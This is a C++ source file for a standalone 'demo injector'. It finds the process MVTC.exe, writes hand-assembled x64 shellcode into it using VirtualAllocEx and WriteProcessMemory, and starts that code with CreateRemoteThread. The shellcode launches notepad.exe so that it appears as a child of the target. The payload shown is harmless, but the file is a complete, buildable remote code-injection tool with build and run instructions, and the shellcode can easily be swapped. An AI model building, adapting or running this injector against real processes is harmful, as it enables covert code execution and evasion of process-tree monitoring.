// mvtc_pop_notepad.cpp — standalone demo injector
//
// What it does:
//   1. Auto-finds MVTC.exe (biggest working set wins if multiple)
//   2. Injects 45-byte shellcode that calls WinExec("notepad.exe", SW_SHOW)
//   3. Thread exits cleanly (ret) so MVTC stays alive
//   4. Notepad appears as a child of MVTC — visible in System Informer tree
//
// Build (any MSVC Developer PowerShell):
//   cl /EHsc /O2 /nologo mvtc_pop_notepad.cpp /link psapi.lib /OUT:pop.exe
//
// Run: double-click pop.exe (or `.\pop.exe` in a shell)
// No arguments needed. MVTC must be running.

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "psapi.lib")

static DWORD find_mvtc() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD best_pid  = 0;
    SIZE_T best_set = 0;

    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, "MVTC.exe") != 0) continue;

        HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (!h) continue;

        PROCESS_MEMORY_COUNTERS pmc = {};
        if (GetProcessMemoryInfo(h, &pmc, sizeof(pmc)) && pmc.WorkingSetSize > best_set) {
            best_set = pmc.WorkingSetSize;
            best_pid = pe.th32ProcessID;
        }
        CloseHandle(h);
    } while (Process32Next(snap, &pe));

    CloseHandle(snap);
    return best_pid;
}

int main() {
    printf("[*] searching for MVTC.exe...\n");
    DWORD pid = find_mvtc();
    if (!pid) {
        printf("[!] MVTC.exe is not running. Launch it first, then re-run this EXE.\n");
        system("pause");
        return 1;
    }
    printf("[+] found MVTC main process at PID %lu\n", pid);

    // kernel32 lives at the same base in every process on the same boot, so we can
    // resolve WinExec on our side and bake the address into the shellcode.
    FARPROC winexec = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
    if (!winexec) { printf("[!] WinExec not found\n"); system("pause"); return 2; }
    printf("[+] WinExec @ %p (same in target)\n", winexec);

    // Position-independent x64 shellcode:
    //   sub  rsp, 0x28              ; shadow space + alignment
    //   lea  rcx, [rip + 0x16]      ; -> "notepad.exe"
    //   mov  edx, 1                 ; SW_SHOWNORMAL
    //   mov  rax, <WinExec>         ; baked in by injector
    //   call rax
    //   add  rsp, 0x28
    //   ret                         ; thread exits cleanly -> ExitThread
    //   "notepad.exe\0"
    unsigned char shellcode[] = {
        0x48,0x83,0xEC,0x28,
        0x48,0x8D,0x0D, 0x16,0x00,0x00,0x00,
        0xBA,0x01,0x00,0x00,0x00,
        0x48,0xB8, 0,0,0,0,0,0,0,0,
        0xFF,0xD0,
        0x48,0x83,0xC4,0x28,
        0xC3,
        'n','o','t','e','p','a','d','.','e','x','e',0
    };
    memcpy(shellcode + 18, &winexec, 8);
    printf("[+] shellcode built: %zu bytes\n", sizeof(shellcode));

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        printf("[!] OpenProcess %lu failed: %lu\n", pid, GetLastError());
        system("pause");
        return 3;
    }

    LPVOID remote = VirtualAllocEx(hProc, nullptr, sizeof(shellcode),
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!remote) { printf("[!] VirtualAllocEx %lu\n", GetLastError()); system("pause"); return 4; }

    SIZE_T w = 0;
    WriteProcessMemory(hProc, remote, shellcode, sizeof(shellcode), &w);
    printf("[+] wrote shellcode to %p (%zu bytes)\n", remote, w);

    HANDLE hT = CreateRemoteThread(hProc, nullptr, 0,
                                   (LPTHREAD_START_ROUTINE)remote,
                                   nullptr, 0, nullptr);
    if (!hT) { printf("[!] CreateRemoteThread %lu\n", GetLastError()); system("pause"); return 5; }
    printf("[+] CreateRemoteThread fired\n");
    WaitForSingleObject(hT, 3000);

    CloseHandle(hT);
    CloseHandle(hProc);

    printf("\n[+] DONE. Check Task Manager / System Informer:\n");
    printf("    - Task Manager -> Details tab -> find notepad.exe, 'Parent PID' column = %lu\n", pid);
    printf("    - System Informer -> process tree -> notepad.exe indented under MVTC.exe (PID %lu)\n", pid);
    system("pause");
    return 0;
}
